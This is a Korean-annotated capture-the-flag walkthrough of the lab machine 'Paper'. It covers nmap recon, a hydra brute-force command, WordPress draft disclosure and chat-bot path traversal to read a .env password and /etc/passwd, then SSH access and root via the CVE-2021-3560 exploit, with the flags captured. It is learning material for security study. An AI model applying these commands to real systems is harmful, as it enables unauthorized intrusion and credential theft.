@@ -1,0 +1,231 @@
+Machine: Paper 
+TARGET: 10.129.136.31
+
+nmap -sV -sC -oA nmap/Paper $ip  
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
+|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
+|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+|_http-title: HTTP Server Test Page powered by CentOS
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+|_http-title: HTTP Server Test Page powered by CentOS
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
+| Subject Alternative Name: DNS:localhost.localdomain
+| Not valid before: 2021-07-03T08:52:34
+|_Not valid after:  2022-07-08T10:32:34
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+| tls-alpn: 
+|_  http/1.1
+
+22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
+
+80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+
+443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+
+운영체제는 centos이고 apache 2.4.37 openssl/1.1.1k 사용중중
+
+apache 2.4.37에서 권한상승 취약점을 찾았으나 현재로선 사용불가능
+https://www.exploit-db.com/exploits/46676
+
+
+셸을 얻기 위한 취약점을 찾아봤으나 실패 웹도 기본페이지
+
+burpsuite으로 http 요청 탐색 중
+
+
+HTTP/1.1 403 Forbidden
+Date: Tue, 29 Jul 2025 12:22:47 GMT
+Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+X-Backend-Server: office.paper
+Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
+ETag: "30c0b-5c5c7fdeec240"
+Accept-Ranges: bytes
+Content-Length: 199691
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+
+
+office.paper라는 도메인 발견
+
+/etc/hosts에 아래줄 추가
+10.129.136.31   office.paper
+
+http://office.paper/ 접속
+웹페이지 아래를 보면 wordpress로 작성된걸 알 수 있다
+Blunder Tiffin Inc. Proudly Powered By WordPress
+
+웹페이지를 탐색
+
+
+Feeling Alone!
+I am sorry everyone. I wanted to add every one of my friends to this blog, but Jan didn’t let me.
+
+So, other employees who were added to this blog are now removed.
+
+As of now there is only one user in this blog. Which is me! Just me.
+
+nick
+June 20, 2021 at 2:49 pm
+Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
+-Nick
+
+몇몇 글을 보면 사용자 Jan nick michael 등의 정보가 있다 + 사용자로는 michael만 남아있음 michael로 브루트포싱 시도해볼만함
+
+
+hydra -l michael -P /usr/share/wordlists/rockyou.txt http://office.paper/ http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid"
+
+실패 
+
+페이지소스에서 현재 워드프레스 버전 노출
+<meta name="generator" content="WordPress 5.2.3" />
+
+searchsploit Wordpress 5.2.3
+
+--------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                           |  Path
+--------------------------------------------------------------------------------------------------------- ---------------------------------
+NEX-Forms WordPress plugin < 7.9.7 - Authenticated SQLi                                                  | php/webapps/51042.txt
+WordPress Core 5.2.3 - Cross-Site Host Modification                                                      | php/webapps/47361.pl
+WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                  | multiple/webapps/47690.md
+WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                                                  | php/dos/47800.py
+WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                      | php/webapps/39553.txt
+WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                | php/webapps/44943.txt
+WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                              | php/webapps/48918.sh
+--------------------------------------------------------------------------------------------------------- ---------------------------------
+
+
+WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts         | multiple/webapps/47690.md
+searchsploit -m 47690.md
+cat 47690.md
+
+
+In this case, simply reversing the order of the returned elements suffices and
+ `http://wordpress.local/?static=1&order=asc` will show the secret content:    
+
+http://office.paper/?static=1&order=asc
+404
+
+
+http://office.paper/?static=1&order=desc 로시도
+숨겨져있던 대화내용이 나왔다
+
+
+[INT:DAY]
+
+Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….
+
+# Secret Registration URL of new Employee chat system
+
+http://chat.office.paper/register/8qozr226AhkCHZdyY
+
+# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.
+
+# Also, stop looking at my drafts. Jeez!
+
+
+
+http://chat.office.paper/register/8qozr226AhkCHZdyY
+채팅 웹사이트 주소를 알아냈다
+
+/etc/hosts에 아래줄 추가
+10.129.136.31   chat.office.paper
+
+
+
+http://chat.office.paper/register/8qozr226AhkCHZdyY  접속
+
+회원가입후 접속하면 채팅방에 초대된다 내부 사내 채팅방같음
+
+recyclops라는 채팅봇을 새로추가함
+
+봇 기능 일부
+
+3. Files:
+eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file sale/secret.xls' or just 'recyclops file test.txt'
+4. List:
+You can ask me to list the files
+eg: 'recyclops i need directory list sale' or just 'recyclops list sale'
+
+recyclops에게 요청 보내기
+
+list ./
+
+total 0
+drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 .
+drwx------ 11 dwight dwight 281 Feb 6 2022 ..
+drwxr-xr-x 2 dwight dwight 27 Sep 15 2021 sale
+drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2
+
+
+file sale/portfolio.txt
+Portfolio
+----------
+- Bill
+- Served the country in war
+- Family built the country
+- purchased paper worth a million dollars
+- will probably fire me.
+<!=====End of file sale/portfolio.txt=====>
+
+list가 ls file이 cat으로 보면 될거같음
+
+file ../hubot/.env 
+
+export ROCKETCHAT_URL='http://127.0.0.1:48320'
+export ROCKETCHAT_USER=recyclops
+export ROCKETCHAT_PASSWORD=Queenofblad3s!23
+
+recyclops의 계정정보 획득
+
+file ../../../../../../../etc/passwd
+rocketchat❌1001:1001::/home/rocketchat:/bin/bash
+dwight❌1004:1004::/home/dwight:/bin/bash
+
+dwight사용자로 ssh접속시도
+
+ssh dwight@10.129.136.31
+password: Queenofblad3s!23
+
+ssh 접속성공
+
+cat user.txt 
+> 07ddc12d5a2a265d088434846d4013b3
+
+
+linpeas.sh 실행
+
+Vulnerable to CVE-2021-3560
+https://www.exploit-db.com/exploits/50011
+
+50011.sh 리모트 호스트로 전송
+
+chmod +x 50011.sh 
+./50011.sh
+
+
+su - hacked
+password: password
+
+sudo su
+password: password
+root 권한 획득
+
+cat /root/root.txt
+
+> ca7d84ad2118d05903527d5de1120254
+ 
